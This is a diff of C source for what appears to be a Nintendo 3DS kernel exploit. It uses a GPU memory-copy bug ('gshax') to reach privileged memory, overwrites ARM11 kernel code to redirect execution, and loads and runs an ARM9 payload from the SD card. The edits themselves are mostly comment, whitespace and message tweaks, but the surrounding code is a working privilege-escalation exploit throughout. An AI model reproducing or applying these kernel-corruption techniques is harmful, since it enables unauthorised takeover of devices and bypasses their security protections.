@@ -19,14 +19,14 @@ s32 sd_arm9_loaded = 0;
 u8 is_healed_svc_handler = 0;
 
 
-/* overwrites two instructions (8 bytes in total) at src_addr with
-   a code to redirect the code flow to dst_addr */ 
-void redirect_codeflow(void *dst_addr, void *src_addr) {
-	*(u32 *)(src_addr + 4) = dst_addr;
-	*(u32 *)src_addr = ARM_JUMPOUT;	
+/* overwrites two instructions (8 bytes in total) at src_addr
+   with code that redirects execution to dst_addr */ 
+void redirect_codeflow(u32 *dst_addr, u32 *src_addr) {
+	*(src_addr + 1) = dst_addr;
+	*src_addr = ARM_JUMPOUT;	
 }
 
-/* exploits a bug that causes the GPU to access memory
+/* exploits a bug that causes the GPU to copy memory
    that otherwise would be inaccessible to code from
    non-privileged code */
 int do_gshax_copy(void *dst, void *src, unsigned int len) {
@@ -116,9 +116,9 @@ void priv_write_four(u32 address) {
 void user_clear_icache() {
 	int i, result = 0;
 	int (*nop_func)(void);
-	const int size_nopslide = 0x1000;
-	
+	const int size_nopslide = 0x1000;	
 	u32 nop_slide[size_nopslide] __attribute__((aligned(0x1000)));		
+
 	HB_ReprotectMemory(nop_slide, 4, 7, &result);
 
 	for (i = 0; i < size_nopslide / sizeof(u32); i++) {
@@ -143,7 +143,9 @@ int corrupt_arm11_kernel_code(void) {
 	// get system dependent data required for the exploit		
 	if (get_exploit_data(&ed)) {
 		
-		// copy system dependent data required by the exploit's ARM11 kernel code
+		/* prepare system-dependant data required by
+		the exploit's ARM11 kernel code */
+		
 		arm11shared.va_hook1_ret = ed.va_hook1_ret;
 		arm11shared.va_pdn_regs = ed.va_pdn_regs;
 		arm11shared.va_pxi_regs = ed.va_pxi_regs;
@@ -180,7 +182,7 @@ int load_arm9_payload(char *filename, void *buf, u32 buf_size, u32 *out_size) {
 		fseek(f , 0, SEEK_END);
 		fsize = ftell(f);
 		rewind(f);
-		if (fsize>=8 && !(fsize % 4) && (fsize < buf_size)) {
+		if (fsize >= 8 && !(fsize % 4) && (fsize < buf_size)) {
 				u32 bytes_read = fread(buf, 1, fsize, f);
 				if (bytes_read == fsize) {
 					*out_size = fsize;
@@ -321,14 +323,13 @@ int run_exploit() {
 	printf("[+] Getting ARM11 kernel privileges\n");
 	
 	if(corrupt_arm11_kernel_code ()) {
-		printf("[+] Loading ARM9 payload\n");
-		
+	
 		// if present in SD root, load arm9payload.bin 
 		sd_arm9_loaded = load_arm9_payload("/arm9payload.bin",
 		                                   &sd_arm9_buf,
 		                                   sizeof(sd_arm9_buf),
 		                                   &sd_arm9_size);
-		printf("[+] Using %s payload\n",
+		printf("[+] Loaded %s ARM9 payload\n",
 				sd_arm9_loaded ? "external" : "built-in");
 		
 		printf("[+] Running payload\n");	
@@ -343,7 +344,7 @@ int run_exploit() {
 		}
 	}
 	else
-		printf("[!] 3DS model/firmware not yet supported.\n");
+		printf("[!] 3DS model/firmware not yet supported\n");
 
 	return 0;
 }
